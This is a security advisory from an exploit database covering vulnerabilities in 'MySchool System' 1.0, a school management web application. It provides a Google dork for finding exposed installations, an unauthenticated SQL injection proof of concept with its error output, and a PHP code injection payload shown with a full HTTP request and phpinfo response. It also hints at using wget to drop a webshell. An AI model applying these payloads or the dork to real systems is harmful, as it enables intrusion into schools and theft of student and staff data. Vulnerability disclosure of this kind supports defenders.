---
title: MySchool System - Multiple Vulnerabilities
url: https://cxsecurity.com/issue/WLB-2025010033
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-01-30
fetch_date: 2025-10-06T20:04:39.873118
---

# MySchool System - Multiple Vulnerabilities

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **MySchool System - Multiple Vulnerabilities** **2025.01.29**  Credit:  **[bRpsd](https://cxsecurity.com/author/bRpsd/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
.:. Exploit Title > MySchool System - Multiple Vulnerabilities
.:. Google Dorks .:.
inurl:web/teacher\_app
.:. Date:Jan 20, 2025
.:. Exploit Author: bRpsd
.:. Contact: cy[at]live.no
.:. Vendor -> https://myschool-system.com/
.:. Vendor has been notified and has released patches
.:. Affected Version: 1.0
.:. Tested on > macOS [\*nix Darwin Kernel], on local xampp
.:. Big thanks to wa-3, Telegram: @wa0\_3
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#############
|DESCRIPTION|
#############
"MySchool is a multi-purpose online school management software, an innovative, powerful and easy-to-use interface used by hundreds of educational institutions such as schools, colleges, universities...etc.
- With the passage of time, new technologies occur in managing the educational process, so it is important for educational institutions to manage all the data and work in a professional manner to save both time and money.
- MySchool has been used in many educational institutions in Egypt and the Gulf countries since 2007.
We are constantly developing our programs to provide the best solutions and services to our customers. As a company, we are well known to the customers we serve, but we want to go beyond our current customer base to potential customers from schools, colleges and institutes and increase awareness of the MySchool program worldwide.
- My School is the best school management system. We have developed a system that is required by all education systems around the world."
Vulnerability 1: Unauthenticated SQL Injection
Types: boolean-based blind,error-based, time-based blind
Path: localhost/forgot\_password.php
Vul Parameter: User [POST]
Vulnerable Code:
#################################################################################################
if ($\_SERVER['REQUEST\_METHOD']== "POST") {
$Res = mysqli\_query($GLOBALS["\_\_\_mysqli\_ston"], "SELECT \* FROM users where User ='$User' ");
#################################################################################################
Proof of concept:
POST http://localhost/forgot\_password.php
User='
Response Error:
Fatal error: Uncaught mysqli\_sql\_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1 in /forgot\_password.php:38 Stack trace: #0 /forgot\_password.php(38): mysqli\_query() #1 {main} thrown in /forgot\_password.php on line 38
NOTE: This isn't the only SQLi, there's plenty in the system Im too lazy to list them all
Example: /ajax/get\_grades.php?schoolId=2'&yearId=24
===========================================================================================
Vulnerability 2: Authenticated Server Side Code Injection - PHP Code Injection
Note: Authentication can be easily acquired from the former SQLi
Path: localhost/btn\_01.php
Vul Parameter: Grade\_ID [GET]
Vul Parameter2: Subject\_ID [GET]
Payload Used: ";phpinfo();$var="
Possible payload for RCE: file\_put\_contents combined with wget to have a webshell
Vulnerable code:
$data = array($MemberActive, $Year\_List\_Calc\_St, $Sub\_Level, $CP\_Type, $success, $Division\_ID, $Room\_ID, $Grade\_ID, $Student\_Group\_ID, $S\_User, $Sub\_UserID);
return ($data);
if (!$success) {
if ($MS\_Option['cacheEnabled1']) {
$today = date("Y-m-d");
$cacheFactor = $today . "-" . $S\_UserName . "-" . $Original\_User . "-" . $S\_Password . "-" . $\_SESSION['Sub\_Level'];
$htmlCacheFileName = md5($cacheFactor);
if (file\_exists("cache/login/$htmlCacheFileName")) {
$fileContent2 = file\_get\_contents("cache/login/$htmlCacheFileName");
eval('$xl = ' . $fileContent2 . ';');
}
}
}
Proof of concept:
POST https://localhost/btn\_01.php?CurrentLine=1&page\_no=1&sort=ID&Page\_ID=15340&Grade\_ID=%22%3Bphpinfo%28%29%3B%24var%3D%22&Subject\_ID=&stopEnablePanel=1 HTTP/1.1
host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: \*/\*
Accept-Language: en-US,en;q=0.5
Content-Type: multipart/form-data; boundary=---------------------------56011178726845606972928094726
Content-Length: 555
Origin: https://localhost
Connection: keep-alive
Referer: https://localhost/cp
Cookie: PHP84SESSID=b14675e2e1fecf65008c200e665c743e
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
-----------------------------56011178726845606972928094726
Content-Disposition: form-data; name="skipLastVisited"
undefined
-----------------------------56011178726845606972928094726
Content-Disposition: form-data; name="Location\_CP\_Type"
undefined
-----------------------------56011178726845606972928094726
Content-Disposition: form-data; name="subMenuId"
undefined
-----------------------------56011178726845606972928094726
Content-Disposition: form-data; name="do"
view
-----------------------------56011178726845606972928094726--
Response:
HTTP/1.1 200 OK
Date: Wed, 29 Jan 2025 15:19:00 GMT
Server: Apache
X-Powered-By: PHP/8.4.3
X-XSS-Protection: 0
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Upgrade: h2
Connection: Upgrade, Keep-Alive
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Content-Type: text/html; charset=utf-8
content-length: 373447
<title>PHP 8.4.3 - phpinfo()</title><meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE" /></head>
<body><div class="center">
<table>
<tr class="h"><td>
<a href="https://www.php.net/"><h1 class="p">PHP Version 8.4.3</h1>
</td></tr>
</table>
<table>...
==========================================================================================
There is also CSRF,XSS,External Redirect but I don't see them as a real threat to be honest.

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025010033)

[Tweet](https://twitter.com/share)

Vote...